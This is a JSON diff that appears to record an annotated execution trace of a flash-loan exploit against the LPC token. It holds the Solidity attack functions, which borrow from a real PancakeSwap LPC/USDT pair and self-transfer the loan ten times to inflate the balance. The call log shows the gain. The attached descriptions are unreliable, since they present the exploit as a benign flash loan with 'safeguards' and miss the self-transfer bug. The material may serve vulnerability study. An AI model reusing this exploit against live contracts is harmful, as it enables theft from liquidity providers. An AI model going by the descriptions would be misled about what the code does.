@@ -1,0 +1,422 @@
+[
+    {
+        "id": "450499",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"LPC balance\", IERC20(LPC).balanceOf(address(this)), 18);\n\n        console.log(\"Get LPC reserve in PancakeSwap...\");\n        (uint256 LPC_reserve,,) = IPancakePair(pancakePair).getReserves();\n        emit log_named_decimal_uint(\"\\tLPC Reserve\", LPC_reserve, 18);\n\n        console.log(\"Flashloan all the LPC reserve...\");\n        uint256 borrowAmount = LPC_reserve - 1; // -1 to avoid trigger INSUFFICIENT_LIQUIDITY\n        bytes memory data = unicode\"\u26a1\ud83d\udcb0\";\n        IPancakePair(pancakePair).swap(borrowAmount, 0, address(this), data);\n        console.log(\"Flashloan ended\");\n\n        emit log_named_decimal_uint(\"LPC balance\", IERC20(LPC).balanceOf(address(this)), 18);\n        console.log(\"\\nNext transaction will swap LPC to USDT\");\n    }\n\n",
+        "description": "1. Core functions:  \nThe `testExploit` function is designed to simulate a flash loan operation in a decentralized finance (DeFi) environment. It first checks the balance of a specific token (LPC) held by the contract. Then, it retrieves the reserve amount of LPC in a PancakeSwap liquidity pool. Using this information, it initiates a flash loan to borrow nearly all the LPC reserves from the pool. After the flash loan is completed, it logs the updated LPC balance and prepares for the next step, which involves swapping LPC to USDT.\n\n2. Security mechanism:  \nThe function includes several safeguards to ensure smooth execution. For example, it borrows slightly less than the total reserve (`LPC_reserve - 1`) to avoid triggering an \"insufficient liquidity\" error. Additionally, it uses `emit` statements to log key data points, such as the LPC balance and reserve, which helps in monitoring and debugging. The use of `bytes memory data` with a specific unicode string (`unicode\"\u26a1\ud83d\udcb0\"`) suggests that additional data is passed during the swap operation, possibly for identification or tracking purposes.\n\n3. Parameter Function:  \nThe function does not take any explicit parameters. However, it relies on predefined variables like `LPC` (the token address) and `pancakePair` (the PancakeSwap liquidity pool address). These variables are crucial for interacting with the token and the liquidity pool. The `borrowAmount` is calculated dynamically based on the LPC reserve, ensuring the flash loan does not exceed available liquidity.\n\n4. Return description:  \nThe function does not return any value directly. Instead, it logs key information using `emit` and `console.log` statements. These logs include the LPC balance before and after the flash loan, as well as the LPC reserve in the PancakeSwap pool. The purpose of these logs is to provide transparency and track the state changes during the execution of the function.\n\nIn summary,  \nThe `testExploit` function simulates a flash loan operation by borrowing nearly all the LPC reserves from a PancakeSwap liquidity pool. It includes safeguards to avoid errors and logs key data for monitoring. The function relies on predefined variables and dynamically calculates the borrow amount, ensuring smooth execution. While it does not return a value, it provides detailed logs to track its actions.",
+        "return_value": "1471631305214575886816445 [1.471e24], 45388000969065395835964 [4.538e22], 1658723699 [1.658e9]"
+    },
+    {
+        "id": "2642",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "0",
+        "args": "\"Get LPC reserve in PancakeSwap...\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"Flashloan all the LPC reserve...\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "96669",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1471631305214575886816444 [1.471e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "10522",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "4824",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "284445",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1471631305214575886816444 [1.471e24], 0, 0xe29aa1f09f92b0",
+        "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        console.log(\"\\tSuccessfully borrow LPC from PancakeSwap\");\n        uint256 LPC_balance = IERC20(LPC).balanceOf(address(this));\n        emit log_named_decimal_uint(\"\\tFlashloaned LPC\", LPC_balance, 18);\n\n        console.log(\"\\tExploit...\");\n        for (uint8 i; i < 10; ++i) {\n            console.log(\"\\tSelf transfer... Loop %s\", i);\n            IERC20(LPC).transfer(address(this), LPC_balance);\n        }\n\n        console.log(\"\\tPayback flashloan...\");\n        uint256 paybackAmount = amount0 / 90 / 100 * 10_000; // paybackAmount * 90% = amount0  --> fee = 10%\n        IERC20(LPC).transfer(pancakePair, paybackAmount);\n    }\n",
+        "description": "1. Core functions:  \nThis function is designed to handle a specific type of transaction called a \"flash loan\" from PancakeSwap, a decentralized exchange. It first borrows a token (LPC) using the flash loan mechanism, then performs a series of self-transfers of the borrowed tokens. Finally, it calculates and pays back the loan amount with an additional fee. The function also logs key steps and emits an event to track the borrowed amount.\n\n2. Security mechanism:  \nThe function uses the `external` modifier, which restricts its access to external calls only, preventing internal misuse. It also relies on the `console.log` statements for debugging and transparency, though these do not affect the contract's security. The function does not include explicit access control or reentrancy guards, which could be potential vulnerabilities if not handled carefully in the broader contract context.\n\n3. Parameter Function:  \n- `sender`: Represents the address that initiated the flash loan.  \n- `amount0`: The amount of the first token borrowed in the flash loan.  \n- `amount1`: The amount of the second token borrowed in the flash loan (not used in this function).  \n- `data`: Additional data passed with the flash loan (not used in this function).  \n\n4. Return description:  \nThe function does not return any value. Instead, it performs actions such as borrowing tokens, transferring them internally, and repaying the loan with a calculated fee. The repayment amount is derived by dividing `amount0` by 90 and then by 100, and multiplying the result by 10,000, effectively calculating a 10% fee on the borrowed amount.  \n\nIn summary,  \nThis function manages a flash loan from PancakeSwap, performs internal token transfers, and repays the loan with a fee. It logs key steps for transparency but lacks explicit security measures like access control or reentrancy protection. The parameters provide details about the loan and its initiator, while the function focuses on executing the loan process without returning a value.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"\\tSuccessfully borrow LPC from PancakeSwap\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "872",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1353900800797409815871132 [1.353e24]"
+    },
+    {
+        "id": "0",
+        "args": "\"\\tExploit...\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"\\tSelf transfer... Loop %s\", 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41169",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1353900800797409815871132 [1.353e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2022",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "824",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "0",
+        "args": "\"\\tSelf transfer... Loop %s\", 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "21269",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1353900800797409815871132 [1.353e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2022",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "824",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "0",
+        "args": "\"\\tSelf transfer... Loop %s\", 2",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "21269",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1353900800797409815871132 [1.353e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2022",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "824",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "0",
+        "args": "\"\\tSelf transfer... Loop %s\", 3",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "21269",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1353900800797409815871132 [1.353e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2022",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "824",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "0",
+        "args": "\"\\tSelf transfer... Loop %s\", 4",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "21269",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1353900800797409815871132 [1.353e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2022",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "824",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "0",
+        "args": "\"\\tSelf transfer... Loop %s\", 5",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "21269",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1353900800797409815871132 [1.353e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2022",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "824",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "0",
+        "args": "\"\\tSelf transfer... Loop %s\", 6",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "21269",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1353900800797409815871132 [1.353e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2022",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "824",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "0",
+        "args": "\"\\tSelf transfer... Loop %s\", 7",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "21269",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1353900800797409815871132 [1.353e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2022",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "824",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "0",
+        "args": "\"\\tSelf transfer... Loop %s\", 8",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "21269",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1353900800797409815871132 [1.353e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2022",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "824",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "0",
+        "args": "\"\\tSelf transfer... Loop %s\", 9",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "21269",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1353900800797409815871132 [1.353e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2022",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "824",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "0",
+        "args": "\"\\tPayback flashloan...\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "23269",
+        "args": "PancakeSwap LPC/USDT: [0x2ecD8Ce228D534D8740617673F31b7541f6A0099], 1635145894682862096460000 [1.635e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "4022",
+        "args": "PancakeSwap LPC/USDT: [0x2ecD8Ce228D534D8740617673F31b7541f6A0099]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2824",
+        "args": "PancakeSwap LPC/USDT: [0x2ecD8Ce228D534D8740617673F31b7541f6A0099]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "872",
+        "args": "PancakeSwap LPC/USDT: [0x2ecD8Ce228D534D8740617673F31b7541f6A0099]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1504334223108233128743201 [1.504e24]"
+    },
+    {
+        "id": "2531",
+        "args": "PancakeSwap LPC/USDT: [0x2ecD8Ce228D534D8740617673F31b7541f6A0099]",
+        "original_code": null,
+        "description": null,
+        "return_value": "45388000969065395835964 [4.538e22]"
+    },
+    {
+        "id": "0",
+        "args": "\"Flashloan ended\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "872",
+        "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "12174642273450718025425582 [1.217e25]"
+    },
+    {
+        "id": "0",
+        "args": "\"\\nNext transaction will swap LPC to USDT\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    }
+]
